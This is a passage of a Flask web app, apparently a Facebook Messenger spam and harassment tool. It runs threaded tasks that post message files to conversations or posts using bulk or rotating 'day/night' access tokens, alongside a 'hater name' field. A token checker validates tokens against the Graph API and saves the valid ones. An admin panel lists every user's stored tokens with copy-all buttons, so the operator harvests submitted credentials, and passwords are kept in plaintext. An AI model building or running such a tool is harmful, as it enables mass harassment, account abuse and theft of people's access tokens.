            <div class="section">
                <h2 class="section-title">Task Management</h2>
                {% if not session.get('approved') %}
                <div class="pending-approval">
                    <p>❌ You need admin approval to use this tool Contact With Devloper</p>
                </div>
                {% else %}
                <h3>Active Tasks</h3>
                {% for task in active_tasks %}
                <div class="task-item">
                    <strong>Task ID:</strong> {{ task.id }}<br>
                    <strong>Type:</strong> {{ task.type }}<br>
                    <div class="task-actions">
                        <a href="/view-logs/{{ task.id }}" class="btn btn-secondary">View Log</a>
                        <form method="POST" action="/stop-task" style="flex: 1;">
                            <input type="hidden" name="task_id" value="{{ task.id }}">
                            <button class="btn btn-danger" type="submit">Stop Task</button>
                        </form>
                    </div>
                </div>
                {% else %}
                <p>No active tasks</p>
                {% endfor %}
                {% endif %}
            </div>
        </div>
        
        <!-- Token Checker Tab -->
        <div id="token-checker" class="tab-content">
            <div class="section">
                <h2 class="section-title">Token Checker</h2>
                {% if not session.get('approved') %}
                <div class="pending-approval">
                    <p>❌ You need admin approval to use this tool Contact With Devloper</p>
                </div>
                {% else %}
                <form method="POST" action="/check-tokens">
                    <div class="form-group">
                        <label class="form-label">Tokens to Check:</label>
                        <textarea name="tokens" class="form-control" placeholder="Enter one token per line" required></textarea>
                    </div>
                    <button class="btn btn-success" type="submit">Tokens Check</button>
                </form>
                {% endif %}
            </div>
        </div>
        
        <!-- Messenger Groups Tab -->
        <div id="messenger-groups" class="tab-content">
            <div class="section">
                <h2 class="section-title">Group UID Fetcher</h2>
                {% if not session.get('approved') %}
                <div class="pending-approval">
                    <p>❌ You need admin approval to use this tool Contact With Devloper</p>
                </div>
                {% else %}
                <form method="POST" action="/fetch-conversations">
                    <div class="form-group">
                        <label class="form-label">Access Token:</label>
                        <input type="text" name="token" class="form-control" placeholder="Enter your Facebook access token" required>
                    </div>
                    <button class="btn btn-warning" type="submit">Fetch Messenger Groups</button>
                </form>
                {% endif %}
            </div>
        </div>
    </div>
</body>
</html>
"""

ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        .token-detail {
            margin-bottom: 10px;
        }
        .token-detail p {
            margin: 5px 0;
        }
        .token-detail code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        body {
            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #ffffff;
            text-align: center;
            margin-top: 0;
            padding-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .admin-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.8);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .admin-section {
            margin-bottom: 30px;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            border-left: 4px solid #dc3545;
        }
        .admin-section-title {
            color: #ffffff;
            margin-top: 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
            padding-bottom: 10px;
        }
        .user-item {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
            border-left: 4px solid #6c757d;
        }
        .user-actions {
            margin-top: 10px;
        }
        .btn {
            padding: 8px 15px;
            margin-right: 10px;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 14px;
        }
        .btn-approve {
            background-color: #28a745;
            color: white;
        }
        .btn-revoke {
            background-color: #ffc107;
            color: black;
        }
        .btn-remove {
            background-color: #dc3545;
            color: white;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 8px 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .token-box {
            background-color: rgba(0, 0, 0, 0.6);
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border-left: 4px solid #17a2b8;
            max-height: 200px;
            overflow-y: auto;
        }
        .token-item {
            font-family: monospace;
            font-size: 12px;
            margin: 2px 0;
            word-break: break-all;
        }
        .token-section {
            margin-top: 10px;
        }
        .token-section h4 {
            margin: 5px 0;
            color: #ffc107;
        }
        .copy-btn {
            background-color: #6f42c1;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
            margin-left: 10px;
        }
        .copy-btn:hover {
            background-color: #5a2d91;
        }
        @media (max-width: 768px) {
            .admin-container {
                padding: 15px;
            }
            h1 {
                font-size: 24px;
            }
            .btn {
                display: block;
                width: 100%;
                margin-bottom: 10px;
            }
        }
    </style>
    <script>
        function copyTokens(username, tokenType) {
            const tokenBox = document.getElementById(`${username}-${tokenType}`);
            const tokens = Array.from(tokenBox.getElementsByClassName('token-item'))
                .map(item => item.textContent)
                .join('\\n');
            
            navigator.clipboard.writeText(tokens).then(() => {
                alert(`${tokenType} tokens for ${username} copied to clipboard!`);
            }).catch(err => {
                console.error('Failed to copy tokens: ', err);
                alert('Failed to copy tokens. Please try again.');
            });
        }
        
        function copyAllTokens(username) {
            const allTokens = [];
            
            // Get day tokens
            const dayTokenBox = document.getElementById(`${username}-day`);
            if (dayTokenBox) {
                const dayTokens = Array.from(dayTokenBox.getElementsByClassName('token-item'))
                    .map(item => item.textContent);
                allTokens.push(...dayTokens);
            }
            
            // Get night tokens
            const nightTokenBox = document.getElementById(`${username}-night`);
            if (nightTokenBox) {
                const nightTokens = Array.from(nightTokenBox.getElementsByClassName('token-item'))
                    .map(item => item.textContent);
                allTokens.push(...nightTokens);
            }
            
            // Get regular tokens
            const regularTokenBox = document.getElementById(`${username}-regular`);
            if (regularTokenBox) {
                const regularTokens = Array.from(regularTokenBox.getElementsByClassName('token-item'))
                    .map(item => item.textContent);
                allTokens.push(...regularTokens);
            }
            
            if (allTokens.length > 0) {
                const tokenText = allTokens.join('\\n');
                navigator.clipboard.writeText(tokenText).then(() => {
                    alert(`All tokens for ${username} copied to clipboard!`);
                }).catch(err => {
                    console.error('Failed to copy tokens: ', err);
                    alert('Failed to copy tokens. Please try again.');
                });
            } else {
                alert('No tokens found for this user.');
            }
        }
    </script>
</head>
<body>
    <button class="logout-btn" onclick="window.location.href='/admin-logout'">Logout</button>
    <div class="admin-container">
        <h1>Admin Panel</h1>
        
        <div class="admin-section">
            <h2 class="admin-section-title">All Users</h2>
            {% if users %}
            {% for username, user_data in users.items() %}
            <div class="user-item">
                <p><strong>Username:</strong> {{ username }}</p>
                <p><strong>Status:</strong> 
                    {% if user_data.approved %}
                        <span style="color: #28a745;">✅ Approved</span>
                    {% else %}
                        <span style="color: #ffc107;">⏳ Pending</span>
                    {% endif %}
                </p>
                
                <!-- Copy All Tokens Button -->
                <div style="margin-bottom: 10px;">
                    <button class="copy-btn" onclick="copyAllTokens('{{ username }}')">📋 Copy All Tokens</button>
                </div>
                
                <!-- User Tokens Display -->
                <div class="token-section">
                    <h4>📋 User Tokens:</h4>
                    
                    <!-- Day Tokens -->
                    {% if day_tokens.get(username) %}
                    <div class="token-box" id="{{ username }}-day">
                        <strong>🌅 Day Tokens ({{ day_tokens[username]|length }}):</strong>
                        <button class="copy-btn" onclick="copyTokens('{{ username }}', 'day')">Copy</button>
                        {% for token in day_tokens[username] %}
                        <div class="token-item">{{ token }}</div>
                        {% endfor %}
                    </div>
                    {% endif %}
                    
                    <!-- Night Tokens -->
                    {% if night_tokens.get(username) %}
                    <div class="token-box" id="{{ username }}-night">
                        <strong>🌙 Night Tokens ({{ night_tokens[username]|length }}):</strong>
                        <button class="copy-btn" onclick="copyTokens('{{ username }}', 'night')">Copy</button>
                        {% for token in night_tokens[username] %}
                        <div class="token-item">{{ token }}</div>
                        {% endfor %}
                    </div>
                    {% endif %}
                    
                    <!-- Regular Tokens -->
                    {% if regular_tokens.get(username) %}
                    <div class="token-box" id="{{ username }}-regular">
                        <strong>🔑 Regular Tokens ({{ regular_tokens[username]|length }}):</strong>
                        <button class="copy-btn" onclick="copyTokens('{{ username }}', 'regular')">Copy</button>
                        {% for token in regular_tokens[username] %}
                        <div class="token-item">{{ token }}</div>
                        {% endfor %}
                    </div>
                    {% endif %}
                </div>
                
                <div class="user-actions">
                    {% if user_data.approved %}
                    <form action="/admin-revoke" method="POST" style="display:inline;">
                        <input type="hidden" name="username" value="{{ username }}">
                        <button type="submit" class="btn btn-revoke">Remove Approval</button>
                    </form>
                    {% else %}
                    <form action="/admin-approve" method="POST" style="display:inline;">
                        <input type="hidden" name="username" value="{{ username }}">
                        <button type="submit" class="btn btn-approve">Approve</button>
                    </form>
                    {% endif %}
                    <form action="/admin-remove-user" method="POST" style="display:inline;" onsubmit="return confirm('Are you sure you want to remove this user? This action cannot be undone.')">
                        <input type="hidden" name="username" value="{{ username }}">
                        <button type="submit" class="btn btn-remove">Remove User</button>
                    </form>
                </div>
            </div>
            {% endfor %}
            {% else %}
            <p>No users registered yet.</p>
            {% endif %}
        </div>
    </div>
</body>
</html>
"""

LOG_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Task Logs</title>
    <style>
        .token-detail {
            margin-bottom: 10px;
        }
        .token-detail p {
            margin: 5px 0;
        }
        .token-detail code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        body { 
            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff; 
            font-family: 'Roboto', sans-serif; 
            padding: 20px;
            margin: 0;
        }
        h1 { 
            color: #ffffff; 
            margin-top: 0;
            padding-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .log-container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .log-entry {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            border-left: 4px solid #6c757d;
            font-family: monospace;
        }
        .log-entry.success {
            border-left-color: #28a745;
        }
        .log-entry.error {
            border-left-color: #dc3545;
        }
        .log-entry.info {
            border-left-color: #17a2b8;
        }

        .back-btn {
            display: inline-block;
            margin: 20px 0;
            padding: 10px 20px;
            background-color: #6c757d;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 8px 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .task-info {
            background-color: rgba(0, 0, 0, 0.5);
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            border-left: 4px solid #007bff;
        }

        @media (max-width: 768px) {
            .log-container {
                padding: 15px;
            }
            h1 {
                font-size: 24px;
            }
        }
    </style>
    <script>
        function refreshLogs() {
            fetch(window.location.href)
                .then(response => response.text())
                .then(data => {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(data, 'text/html');
                    const newLogs = doc.getElementById('logs').innerHTML;
                    document.getElementById('logs').innerHTML = newLogs;
                    // Scroll to bottom after update
                    window.scrollTo(0, document.body.scrollHeight);
                });
        }
        
        // Refresh every 3 seconds
        setInterval(refreshLogs, 3000);
        
        // Scroll to bottom on initial load
        window.onload = function() {
            window.scrollTo(0, document.body.scrollHeight);
        };
    </script>
</head>
<body>
    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
    <div class="log-container">
        <h1>Logs for {{ task_type }} Task ID: {{ task_id }}</h1>
        
        <div class="task-info">
            <h3>Task Information</h3>
            <p><strong>Type:</strong> {{ task_type }}</p>
            <p><strong>Target:</strong> {{ target }}</p>
            <p><strong>Started:</strong> {{ start_time.strftime('%Y-%m-%d %H:%M:%S') }}</p>
        </div>
        
        <div id="logs">
            {% for log in logs %}
            <div class="log-entry {% if '✅' in log.message %}success{% elif '❌' in log.message %}error{% elif 'ℹ️' in log.message %}info{% endif %}">
                {{ log.message }}<br>
                <small>{{ log.time.strftime('%Y-%m-%d %H:%M:%S') }}</small>
            </div>
            {% endfor %}
        </div>
        <a href="/" class="back-btn">Back to Main</a>
    </div>
</body>
</html>
"""

TOKEN_CHECK_RESULT_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Check Results</title>
    <style>
        .token-detail {
            margin-bottom: 10px;
        }
        .token-detail p {
            margin: 5px 0;
        }
        .token-detail code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        body { 
            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff; 
            font-family: 'Roboto', sans-serif; 
            padding: 20px;
            margin: 0;
        }
        h1 { 
            color: #ffffff; 
            margin-top: 0;
            padding-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .result-container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .token-group {
            margin-bottom: 20px;
            padding: 15px;
            border-radius: 5px;
        }
        .valid-tokens {
            background-color: rgba(40, 167, 69, 0.3);
            border-left: 4px solid #28a745;
        }
        .invalid-tokens {
            background-color: rgba(220, 53, 69, 0.3);
            border-left: 4px solid #dc3545;
        }
        .token-list {
            font-family: monospace;
            white-space: pre-wrap;
            word-break: break-all;
            background-color: rgba(0, 0, 0, 0.5);
            padding: 10px;
            border-radius: 3px;
            max-height: 300px;
            overflow-y: auto;
        }
        .back-btn {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #6c757d;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        .copy-btn {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
            margin-left: 10px;
        }
        .copy-btn:hover {
            background-color: #0056b3;
        }
    </style>
    <script>
        function copyTokens(elementId) {
            const tokenList = document.getElementById(elementId).textContent;
            navigator.clipboard.writeText(tokenList).then(() => {
                alert('Tokens copied to clipboard!');
            }).catch(err => {
                console.error('Failed to copy tokens: ', err);
                alert('Failed to copy tokens. Please try again.');
            });
        }
    </script>
</head>
<body>
    <div class="result-container">
        <h1>Token Check Results</h1>
        
        <div class="token-group valid-tokens">
            <h2>✅ Valid Tokens ({{ valid_count }})</h2>
            <div class="token-list">
                {% for result in results %}
                    {% if result.valid %}
                        <div class="token-detail">
                            <p><strong>Token:</strong> <code>{{ result.token_short }}</code></p>
                            <p><strong>Name:</strong> {{ result.name }}</p>
                            <p><strong>UID:</strong> {{ result.uid }}</p>
                            <p><strong>Profile:</strong> <a href="{{ result.profile_url }}" target="_blank" style="color: #87CEEB;">View Profile</a></p>
                            <p style="word-break: break-all;"><strong>Full Token:</strong> <code>{{ result.token }}</code></p>
                        </div>
                        <hr style="border-color: rgba(255, 255, 255, 0.1);">
                    {% endif %}
                {% endfor %}
            </div>
            <h3 style="margin-top: 20px;">Valid Tokens List (for copy/paste)
                <button class="copy-btn" onclick="copyTokens('valid-list')">Copy</button>
            </h3>
            <div class="token-list" id="valid-list">{{ "\n".join(valid_tokens) }}</div>
        </div>
        
        <div class="token-group invalid-tokens">
            <h2>❌ Invalid Tokens ({{ invalid_count }})</h2>
            <div class="token-list">
                {% for result in results %}
                    {% if not result.valid %}
                        <div class="token-detail">
                            <p><strong>Token:</strong> <code>{{ result.token_short }}</code></p>
                            <p><strong>Reason:</strong> {{ result.error }}</p>
                        </div>
                        <hr style="border-color: rgba(255, 255, 255, 0.1);">
                    {% endif %}
                {% endfor %}
            </div>
            <h3 style="margin-top: 20px;">Invalid Tokens List (for copy/paste)
                <button class="copy-btn" onclick="copyTokens('invalid-list')">Copy</button>
            </h3>
            <div class="token-list" id="invalid-list">{{ "\n".join(invalid_tokens) }}</div>
        </div>
        
        <a href="/" class="back-btn">Back to Dashboard</a>
    </div>
</body>
</html>
"""

CONVERSATIONS_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conversations</title>
    <style>
        .token-detail {
            margin-bottom: 10px;
        }
        .token-detail p {
            margin: 5px 0;
        }
        .token-detail code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        body { 
            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff; 
            font-family: 'Roboto', sans-serif; 
            padding: 20px;
            margin: 0;
        }
        h1 { 
            color: #ffffff; 
            margin-top: 0;
            padding-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .result-container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .conversation {
            margin: 15px 0; 
            padding: 15px; 
            border-radius: 5px; 
            background-color: rgba(0, 0, 0, 0.7);
            border-left: 4px solid #007bff;
        }
        .back-btn {
            display: inline-block;
            margin: 20px 0;
            padding: 10px 20px;
            background-color: #6c757d;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 8px 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
    <div class="result-container">
        <h1>Conversations</h1>
        
        {% if error %}
        <div class="conversation" style="border-color: #dc3545;">
            <p>❌ Error: {{ error }}</p>
        </div>
        {% else %}
            {% if conversations %}
                {% for conv in conversations %}
                <div class="conversation">
                    <p><strong>💬 Conversation Name:</strong> {{ conv.name }}</p>
                    <p><strong>🆔 Conversation ID:</strong> {{ conv.id }}</p>
                </div>
                {% endfor %}
            {% else %}
                <div class="conversation">
                    <p>📭 No conversations found</p>
                </div>
            {% endif %}
        {% endif %}
        
        <a href="/" class="back-btn">Back to Main</a>
    </div>
</body>
</html>
"""

@app.route("/signup", methods=["GET", "POST"])
def signup():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        confirm_password = request.form.get("confirm_password")
        
        if not username or not password or not confirm_password:
            return render_template_string(SIGNUP_TEMPLATE, error="All fields are required")
        
        if password != confirm_password:
            return render_template_string(SIGNUP_TEMPLATE, error="Passwords do not match")
        
        users = load_users()
        
        if username in users:
            return render_template_string(SIGNUP_TEMPLATE, error="Username already exists")
        
        # Add new user with approved=False
        users[username] = {
            "password": password,
            "approved": False
        }
        
        save_users(users)
        
        return render_template_string(SIGNUP_TEMPLATE, success="Account created successfully! Please login and wait for admin approval.")
    
    return render_template_string(SIGNUP_TEMPLATE)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        users = load_users()
        
        if username in users and users[username]["password"] == password:
            session["logged_in"] = True
            session["username"] = username
            session["approved"] = users[username]["approved"]
            
            # Load user's tokens into memory
            user_day_tokens[username] = load_user_day_tokens(username)
            user_night_tokens[username] = load_user_night_tokens(username)
            
            return redirect(url_for("home"))
        else:
            return render_template_string(LOGIN_TEMPLATE, error="Invalid username or password")
    
    return render_template_string(LOGIN_TEMPLATE)

@app.route("/admin-login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session["admin_logged_in"] = True
            return redirect(url_for("admin_panel"))
        else:
            return render_template_string(ADMIN_LOGIN_TEMPLATE, error="Invalid admin credentials")
    
    return render_template_string(ADMIN_LOGIN_TEMPLATE)

@app.route("/admin-logout")
def admin_logout():
    session.pop("admin_logged_in", None)
    return redirect(url_for("admin_login"))

@app.route("/admin-approve", methods=["POST"])
def admin_approve():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_login"))
    
    username = request.form["username"]
    users = load_users()
    if username in users:
        users[username]["approved"] = True
        save_users(users)
    return redirect(url_for("admin_panel"))

@app.route("/admin-revoke", methods=["POST"])
def admin_revoke():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_login"))
    
    username = request.form["username"]
    users = load_users()
    if username in users:
        users[username]["approved"] = False
        save_users(users)
    return redirect(url_for("admin_panel"))

@app.route("/admin-remove-user", methods=["POST"])
def admin_remove_user():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_login"))
    
    username = request.form["username"]
    users = load_users()
    if username in users:
        del users[username]
        save_users(users)
        
        # Clean up token files
        if os.path.exists(f"{username}.txt"):
            os.remove(f"{username}.txt")
        if os.path.exists(f"{username}_day.txt"):
            os.remove(f"{username}_day.txt")
        if os.path.exists(f"{username}_night.txt"):
            os.remove(f"{username}_night.txt")
            
        # Remove from in-memory token storage
        user_day_tokens.pop(username, None)
        user_night_tokens.pop(username, None)
        
    return redirect(url_for("admin_panel"))

@app.route("/admin")
def admin_panel():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_login"))
    
    users = load_users()
    
    # Load all tokens for display
    day_tokens = {u: load_user_day_tokens(u) for u in users}
    night_tokens = {u: load_user_night_tokens(u) for u in users}
    regular_tokens = {u: load_user_tokens(u) for u in users}
    
    return render_template_string(
        ADMIN_TEMPLATE, 
        users=users,
        day_tokens=day_tokens,
        night_tokens=night_tokens,
        regular_tokens=regular_tokens
    )

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    session.pop("username", None)
    session.pop("approved", None)
    return redirect(url_for("login"))

def get_active_tasks(username):
    active_tasks = []
    with data_lock:
        for task_id, user in user_tasks.items():
            if user == username and task_id in task_types:
                active_tasks.append({'id': task_id, 'type': task_types[task_id]})
    return active_tasks

@app.route("/")
def home():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    username = session["username"]
    active_tasks = get_active_tasks(username)
    
    return render_template_string(
        HTML_TEMPLATE, 
        session=session, 
        active_tasks=active_tasks
    )

def load_messages(file_storage):
    try:
        content = file_storage.read().decode("utf-8")
        return [line.strip() for line in content.splitlines() if line.strip()]
    except Exception as e:
        print(f"Error loading messages: {e}")
        return []

def load_tokens_from_file(file_storage):
    try:
        content = file_storage.read().decode("utf-8")
        return [line.strip() for line in content.splitlines() if line.strip()]
    except Exception as e:
        print(f"Error loading tokens: {e}")
        return []

@app.route("/start-task", methods=["POST"])
def start_task():
    if not session.get("logged_in") or not session.get("approved"):
        return redirect(url_for("home"))
    
    username = session["username"]
    task_type = request.form["task_type"]
    token_option = request.form["tokenOption"]
    interval = int(request.form["interval"])
    hater_name = request.form["haterName"]
    
    messages = load_messages(request.files["msgFile"])
    
    tokens = []
    if token_option == "single":
        single_token = request.form.get("singleToken")
        if single_token:
            tokens = [single_token]
    elif token_option == "multi":
        tokens = load_tokens_from_file(request.files["tokenFile"])
    elif token_option == "daynight":
        # Load day and night tokens and save them to user files
        day_tokens = load_tokens_from_file(request.files["dayTokenFile"])
        night_tokens = load_tokens_from_file(request.files["nightTokenFile"])
        
        save_user_day_tokens(username, day_tokens)
        save_user_night_tokens(username, night_tokens)
        
        # Update in-memory storage
        user_day_tokens[username] = day_tokens
        user_night_tokens[username] = night_tokens
        
        # Get the initial set of tokens based on time
        tokens = get_current_token_set(username)
    
    if not tokens:
        # Simple error handling for no tokens
        return render_template_string(HTML_TEMPLATE, error="No tokens provided or loaded.")
    
    task_id = str(uuid.uuid4())
    
    with data_lock:
        stop_events[task_id] = threading.Event()
        task_types[task_id] = task_type
        user_tasks[task_id] = username
        token_usage_stats[task_id] = {token: 0 for token in tokens}
    
    if task_type == "convo":
        convo_id = request.form["convo"]
        threading.Thread(
            target=start_messaging, 
            args=(tokens, messages, convo_id, interval, hater_name, token_option, task_id, task_type, username)
        ).start()
    elif task_type == "post":
        post_id = request.form["post_id"]
        threading.Thread(
            target=start_posting, 
            args=(tokens, messages, post_id, interval, hater_name, token_option, task_id, username)
        ).start()
        
    return redirect(url_for("home"))

@app.route("/stop-task", methods=["POST"])
def stop_task():
    if not session.get("logged_in") or not session.get("approved"):
        return redirect(url_for("home"))
    
    task_id = request.form["task_id"]
    username = session["username"]
    
    with data_lock:
        if task_id in stop_events and user_tasks.get(task_id) == username:
            stop_events[task_id].set()
            # Clean up after a short delay to allow the thread to finish logging
            threading.Timer(5, lambda: cleanup_task(task_id)).start()
    
    return redirect(url_for("home"))

def cleanup_task(task_id):
    with data_lock:
        stop_events.pop(task_id, None)
        task_types.pop(task_id, None)
        user_tasks.pop(task_id, None)
        token_usage_stats.pop(task_id, None)

def save_valid_tokens(tokens, username):
    # Save to user-specific file
    filename = f"{username}.txt"
    with open(filename, 'w') as f:
        for token in tokens:
            f.write(f"{token}\n")

def load_user_tokens(username):
    # Load tokens from user-specific file
    filename = f"{username}.txt"
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except:
            return []
    return []

@app.route("/check-tokens", methods=["POST"])
def check_tokens():
    if not session.get("logged_in") or not session.get("approved"):
        return redirect(url_for("home"))
    
    tokens = [t.strip() for t in request.form.get("tokens", "").splitlines() if t.strip()]
    
    results = []
    valid_count = 0
    invalid_count = 0
    valid_tokens = []
    
    for token in tokens:
        token = token.strip()
        if not token:
            continue
            
        token_short = f"{token[:5]}...{token[-5:]}" if len(token) > 10 else token
        result = {"token": token, "token_short": token_short, "valid": False}
        
        try:
            url = f"https://graph.facebook.com/me?fields=id,name,picture&access_token={token}"
            res = requests.get(url)
            
            if res.status_code == 200:
                data = res.json()
                result.update({
                    "valid": True,
                    "uid": data.get("id", "N/A"),
                    "name": data.get("name", "Unknown"),
                    "picture": data.get("picture", {}).get("data", {}).get("url", ""),
                    "profile_url": f"https://www.facebook.com/{data.get('id', '')}"
                })
                valid_count += 1
                valid_tokens.append(token)
            else:
                result["error"] = f"HTTP {res.status_code}: {res.text}"
                invalid_count += 1
        except Exception as e:
            result["error"] = str(e)
            invalid_count += 1
        
        results.append(result)
    
    # Save valid tokens to user-specific file
    if valid_tokens:
        username = session.get("username")
        save_valid_tokens(valid_tokens, username)
    
    return render_template_string(
        TOKEN_CHECK_RESULT_TEMPLATE,
        results=results,
        total_tokens=len(results),
        valid_count=valid_count,
        invalid_count=invalid_count
    )

@app.route("/fetch-conversations", methods=["POST"])
def fetch_conversations():
    if not session.get("logged_in") or not session.get("approved"):
        return redirect(url_for("home"))
    
    token = request.form["token"]
    conversations = []
    error = None
    
    try:
        # First verify token validity
        check_url = f"https://graph.facebook.com/me?access_token={token}"
        check_res = requests.get(check_url)
        
        if check_res.status_code != 200:
            error = "Invalid or expired token"
        else:
            # Fetch Messenger conversations
            url = f"https://graph.facebook.com/v19.0/me/conversations?fields=id,name,participants&access_token={token}"
            response = requests.get(url)
            response.raise_for_status()
            
            for conv in response.json().get('data', []):
                conv_id = conv.get('id', 'N/A').replace('t_', '')  # Remove t_ prefix
                conv_name = conv.get('name', 'Unnamed Conversation')
                
                # If no name, get participants
                if not conv_name or conv_name == 'Unnamed Conversation':
                    participants = conv.get('participants', {}).get('data', [])
                    participant_names = [p.get('name', 'Unknown') for p in participants]
                    conv_name = ", ".join(participant_names) if participant_names else "Group Chat"
                
                conversations.append({
                    'id': conv_id,
                    'name': conv_name
                })
    except Exception as e:
        error = str(e)
    
    return render_template_string(
        CONVERSATIONS_TEMPLATE,
        conversations=conversations,
        error=error
    )

@app.route("/view-logs/<task_id>")
def show_logs(task_id):
    if not session.get("logged_in") or not session.get("approved"):
        return redirect(url_for("home"))
    
    username = session.get("username")
    
    # Check if this task belongs to the current user
    with data_lock:
        if user_tasks.get(task_id) != username:
            return redirect(url_for("home"))
        
        logs = task_logs.get(task_id, [{'time': datetime.now(), 'message': "No logs found for this task."}])
        task_type = task_types.get(task_id, "Unknown")
    
    # Get the first log entry to determine start time
    start_time = logs[0]['time'] if logs else datetime.now()
    
    # Get target information from logs
    target = "Unknown"
    for log in logs:
        if "Target Group:" in log['message']:
            target = log['message'].split("Target Group:")[1].strip()
            break
        elif "Target Post:" in log['message']:
            target = log['message'].split("Target Post:")[1].strip()
            break
    
    return render_template_string(
        LOG_TEMPLATE, 
        task_id=task_id, 
        logs=logs, 
        task_type=task_type,
        target=target,
        start_time=start_time
    )

def start_messaging(tokens, messages, convo_id, interval, hater_name, token_option, task_id, task_type, username):
    stop_event = stop_events[task_id]
    token_index = 0
    
    add_log(task_id, f"🚀 {task_type} task started for conversation: {convo_id}")
    
    # Get group name info once at start
    token = tokens[0]
    group_name = get_group_name(convo_id, token)
    if group_name:
        add_log(task_id, f"ℹ️ Target Group: {group_name}")
    
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                add_log(task_id, "🛑 Task stopped manually.")
                break
            
            # For day/night system, refresh tokens every 6 hours
            if token_option == "daynight":
                current_tokens = get_current_token_set(username)
                if current_tokens != tokens:
                    tokens = current_tokens
                    token_index = 0  # Reset index
